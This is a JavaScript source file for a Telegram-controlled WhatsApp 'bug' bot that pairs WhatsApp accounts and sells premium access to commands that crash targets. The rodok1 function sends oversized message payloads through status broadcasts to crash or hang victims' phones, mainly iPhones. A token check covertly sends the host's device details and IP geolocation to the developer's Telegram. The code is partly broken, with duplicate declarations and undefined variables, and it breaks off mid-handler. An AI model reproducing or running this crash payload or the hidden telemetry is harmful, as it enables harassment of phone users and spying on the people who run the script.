const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const os = require("os");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

// Deklarasi variabel sebelum digunakan
let premiumUsers = [];
let adminUsers = [];
let config = {};

// Function untuk memastikan file ada
function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

// Load config dan data
try {
    config = require("./設定/config.js");
} catch (e) {
    config = { BOT_TOKEN: "", OWNER_ID: "" };
}

// Ensure files exist
ensureFileExists('./設定/premium.json');
ensureFileExists('./設定/admin.json');

// Load data setelah file dibuat
try {
    premiumUsers = JSON.parse(fs.readFileSync('./設定/premium.json', 'utf8'));
} catch (e) {
    premiumUsers = [];
}

try {
    adminUsers = JSON.parse(fs.readFileSync('./設定/admin.json', 'utf8'));
} catch (e) {
    adminUsers = [];
}

function getCurrentTime() {
  return new Date().toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" });
}

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
    fs.writeFileSync('./設定/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./設定/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

// Watch files
try {
    watchFile('./設定/premium.json', (data) => (premiumUsers = data));
    watchFile('./設定/admin.json', (data) => (adminUsers = data));
} catch (e) {
    console.error("Error watching files:", e.message);
}

const axios = require("axios");
const chalk = require("chalk");
const TelegramBot = require("node-telegram-bot-api");

// Deklarasi BOT_TOKEN untuk Telegram
const BOT_TOKEN_TELEGRAM = config.BOT_TOKEN || process.env.BOT_TOKEN || "";
const bot = new TelegramBot(BOT_TOKEN_TELEGRAM, { polling: true });

const S_ID = "@Rbcdepp"; // username lu
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/VonziePemula/BotTesBypass/refs/heads/main/token.json"; 

// Deklarasi variabel untuk Telegram Client
const stringSession = "";
const apiId = 0;
const apiHash = "";
const FIRST_RUN_FILE = "./first_run.json";

// === Fungsi Telegram ===
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal ambil daftar token GitHub:", error.message));
    return [];
  }
}
async function initClient() {
  const client = new TelegramClient(stringSession, apiId, apiHash, {
    connectionRetries: 5,
  });
  await client.start();
  return client;
}
async function telegramCltp(message) {
  const client = await initClient();
  await client.sendMessage(S_ID, { message, parseMode: "markdown" });
}
async function telegramClt(message) {
  const client = await initClient();
  let alreadyNotified = false;
  if (fs.existsSync(FIRST_RUN_FILE)) {
    const data = JSON.parse(fs.readFileSync(FIRST_RUN_FILE, "utf-8"));
    alreadyNotified = data.notified || false;
  }
  if (!alreadyNotified) {
    try {
      await client.sendMessage(S_ID, { message });
      fs.writeFileSync(FIRST_RUN_FILE, JSON.stringify({ notified: true }));
    } catch (err) {
      console.error("🚫 BLOCKED:", err.message);
    }
  }
}

// Password langsung ditulis di sini
const correctPassword = "Memeg";

// Buat interface untuk input password
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// === Validasi Token ===
async function validateToken() {
  console.log(chalk.blue("PLEASE WAIT... CHECKING TOKENS"));
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(config.BOT_TOKEN)) {
    const cpus = os.cpus();
    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const lang = process.env.LANG || "Unknown";
    const time = new Date().toLocaleString();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    let ipInfo = {};
    try {
      const { data } = await axios.get("https://ipapi.co/json/");
      ipInfo = data;
    } catch {
      ipInfo = { ip: "N/A", city: "-", country_name: "-", org: "-", latitude: "-", longitude: "-" };
    }
    const report = `
**DETECTED PENYUSUPAN**
**TOKEN :** \`${config.BOT_TOKEN}\`
**OWNER :** \`${config.OWNER_ID}\`
**📅 Timestamp: ${time}**
**🖥️ DEVICE**
• OS: ${os.platform()} ${os.release()}
• CPU: ${cpus[0].model} (${cpus.length} cores)
• Memory: ${totalMem} GB
• Lang: ${lang}
• Timezone: ${timezone}
**📍 LOCATION**
• IP: ${ipInfo.ip}
• ${ipInfo.city}, ${ipInfo.country_name}
• ISP: ${ipInfo.org}
• Koordinat: ${ipInfo.latitude}, ${ipInfo.longitude}
`;
    console.log(chalk.red("🚫 TOKEN BELUM TERDAFTAR...."));
    telegramCltp(report);
    await new Promise(o => setTimeout(o, 3000));
    process.exit(1);
  }
  console.clear();
  console.log(chalk.green("✅ TOKEN TERDAFTAR"));
  startBot();
  initializeWhatsAppConnections();
  telegramClt(`**BOT AKTIF**
**TOKEN :** \`${config.BOT_TOKEN}\`
**OWNER :** \`${config.OWNER_ID}\``);
}

// === Start Bot Banner ===
function startBot() {
  console.log(`
Z                 HAPPY BIRTHDAY BY VEXXUZZZ 
 y
  u 
   r
    o
     X
      z
Script: ZyuroXz
Versi: 1.1
Developer: Vexxuzzz 
Telegram: @VexxuzzZ
YouTube:  @VexxuzzZ
Waktu: ${getCurrentTime()} WIB`);
}

// Panggil Correct setelah setup
correctPassword();

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `L O A D I N G D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Loading...`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `M E N G H U B U N G K A N D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Mennghubungkan`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
G A G A L T E R S A M B U N G
╰➤ Number  : ${botNumber} 
╰➤ Status : Gagal Tersambung 
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `P A I R I N G D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤Pesan : Succes Pairing`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
P A I R I N G D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤ Kode : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
G A G A L B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Erorr❌
╰➤ Pesan : ${error.message}`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  // Simulasi fungsi getBotSpeed
  const endTime = process.hrtime(startTime);
  return (endTime[0] * 1000 + endTime[1] / 1000000).toFixed(2) + "ms";
}

function getBotSpeed(startTime) {
  const endTime = process.hrtime(startTime);
  return (endTime[0] * 1000 + endTime[1] / 1000000).toFixed(2) + "ms";
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://i.top4top.io/p_3553h6hm40.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown 
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}

// Function Bug
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ~ Enc Xopwn Confugurasi
const getVexxuzzZObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `ᨶꪖꪶᨶꫀƙꪖꪹỉᨶ和కỉꪊకỉꪊ无与伦比的帅气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// Conslole Log Chat Id
const log = (message, error = null) => {
    const timestamp = new Date().toISOString().replace("T", " ").replace("Z", "");
    const prefix = `\x1b[36m[ VexxuzzZ ]\x1b[0m`;
    const timeStyle = `\x1b[33m[${timestamp}]\x1b[0m`;
    const msgStyle = `\x1b[32m${message}\x1b[0m`;
    console.log(`${prefix} ${timeStyle} ${msgStyle}`);
    if (error) {
        const errorStyle = `\x1b[31m✖ Error: ${error.message || error}\x1b[0m`;
        console.error(`${prefix} ${timeStyle} ${errorStyle}`);
        if (error.stack) console.error(`\x1b[90m${error.stack}\x1b[0m`);
    }
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_©VexxuzzZ",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}

///// Func
/////---------------[sleep function]------_-_
const bugRequests = {};

// Buat interface untuk input password
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Minta user ketik password
rl.question('Masukkan password: ', (inputPassword) => {
    if (inputPassword !== correctPassword) {
        console.log(chalk.red('❌ Password salah! Akses ditolak.'));
        process.exit(1);
    } else {
        console.log(chalk.green('✅ Password benar! Akses diberikan.'));
        rl.close();

        // ====== TARUH SCRIPT BOT DI BAWAH INI ======
        console.log('Bot sedang berjalan...');
    }
});

/////---------------[sleep function]------_-_
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();
  

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています ( 🫟 ).</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner", url: "https://t.me/BangZyur" }],
      ]
    }
  });
}

  bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>-# Ɀ𐌙𐌵𐌐Ꝋ𐌗Ɀ 𐌒Ꮤ𐌄𐌐𐌕𐌙 -</blockquote>

<blockquote>( 🫟 ) - みなさんこんにちは。戻ってきました。ZyuroXz Qwerty さんへ.
<b>⬡ Author : VexxuzzZ?</b>
<b>⬡ Version : 1.0.0</b>
<b>⬡ Name Bot : ZyuroxZXVO¿?</b>
<b>⬡ Framework : Telegraf</b>
<b>⬡ Library : Javascript</b>
<b>⬡ PRIVATE SCRIPT</b>
</blockquote>
<blockquote>Presss Button Menu ☇ © ZyuroXz</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "ZyuroXz ☇ Qwerty", callback_data: "bugmenu" }, 
        { text: "Thanks ☇ Too", callback_data: "thanksto" }],
        [{ text: "ZyuroXz ☇ Crushy", callback_data: "ownermenu" }],
        [{ text: "ZyuroXz ☇ Developer", url: "https://t.me/BangZyur" }, 
        { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
      ]
    }
  });
});

bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const newImage = getRandomImage();
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
    newCaption = `<blockquote><b>( ! ) - ZyuroXz Virus</b>
<b>𝙳𝚊𝚏𝚝𝚊𝚛 𝚏𝚒𝚝𝚞𝚛 𝚎𝚔𝚜𝚙𝚕𝚘𝚒𝚝 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚜𝚎𝚍𝚒𝚊.</b>

<b>▢ /ZyuRtz ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Delay Hard</b>

<b>▢ /ZyuRNovaXz ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Ber efek delay invisible ( nyedot kuota hard )</b>

<b>▢ /ZyuRIphong ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Invisible ios hard</b>

<b>▢ /ZyuRForce ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Forclose ios hard</b>

<b>▢ /secretjir ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Menghapus bug yg sudah terkirim</b>

<b>-# ( ! ) Note :</b>
<b>Jangan asal mengirim virus ke orang yg tidak bersalah kalo tidak mau ber akibat fatall!!</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "ownermenu") {
    newCaption = `<blockquote><b>( ! ) - ZyuroXz Akses</b>
</blockquote>
<b>▢ /addprem id ☇ days</b>
<b>╰➤ Menambahkan akses pada user</b>

<b>▢ /delprem id</b>
<b>╰➤ Menghapus akses pada user</b>

<b>▢ /addadmin id</b>
<b>╰➤ Menambahkan akses admin pada user</b>

<b>▢ /deladmin id</b>
<b>╰➤ Menghapus akses admin pada use</b>

<b>▢ /listprem</b>
<b>╰➤ Melihat list premium user yang ada</b>

<b>▢ /addsender  ☇ Number</b>
<b>╰➤ Menambah Sender WhatsApp</b>

<blockquote><b>( # ) Note:</b>
<b>Baca dengan teliti Jangan asal ngetik untuk mendapat kan akses</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "thanksto") {
    newCaption = `<blockquote><b>( ! ) - Thanks Too</b>

<b>▢ VexxuzzZ ( Developer )</b>
<b>▢ Udin ( Best Friend )</b>
<b>▢ Abdul ( Best Friend )</b>
<b>▢ Xky ( My Owner )</b>
<b>▢ Lez ( My Teacher Js)</b>
<b>▢ All Partner ZyuroXz </b>
<b>▢ All Pengguna Sc </b>

<b>tqto</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "mainmenu") {
    newCaption = `<blockquote>-# Ɀ𐌙𐌵𐌐Ꝋ𐌗Ɀ 𐌒Ꮤ𐌄𐌐𐌕𐌙 -</blockquote>

<blockquote>( 🫟 ) - みなさんこんにちは。戻ってきました。ZyuroXz Qwerty さんへ.
<b>⬡ Author : VexxuzzZ?</b>
<b>⬡ Version : 1.0.0</b>
<b>⬡ Name Bot : ZyuroxZXVO¿?</b>
<b>⬡ Framework : Telegraf</b>
<b>⬡ Library : Javascript</b>
<b>⬡ PRIVATE SCRIPT</b>
</blockquote>
<blockquote>Presss Button Menu ☇ © ZyuroXz</blockquote>
`;
    newButtons = [
        [{ text: "ZyuroXz ☇ Qwerty", callback_data: "bugmenu" }, 
        { text: "Thanks ☇ Too", callback_data: "thanksto" }],
        [{ text: "ZyuroXz ☇ Crushy", callback_data: "ownermenu" }],
        [{ text: "ZyuroXz ☇ Dev", url: "https://t.me/BangZyur" }, 
        { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
    ];
  }

  bot.editMessageMedia(
    {
      type: "photo",
      media: newImage,
      caption: newCaption,
      parse_mode: "HTML"
    },
    { chat_id: chatId, message_id: messageId }
  ).then(() => {
    bot.editMessageReplyMarkup(
      { inline_keyboard: newButtons },
      { chat_id: chatId, message_id: messageId }
    );
  }).catch((err) => {
    console.error("Error editing message:", err);
  });
});

//=======FUNC BUG=========//

async function rodok1(sock, target, mention) {
  let msg = await generateWAMessageFromContent(sock, {
    buttonsMessage: {
      tesockt: "⭑‌⟅‌༑".repeat(5000),
      contentTesockt: "./Bak1#Team".repeat(777777),
      footerTesockt: "Rixzz.null",
      buttons: [
        {
          buttonId: "null",
          buttonTesockt: {
            displayTesockt: " Bak Here?¿" + "⭑‌⟅‌༑".repeat(4500),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "maklu",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

//=======CASE BUG=========//

bot.onText(/\/ZyuRtz (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRtz
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRtz
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await rodok1(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRtz
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ZyuRForce (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
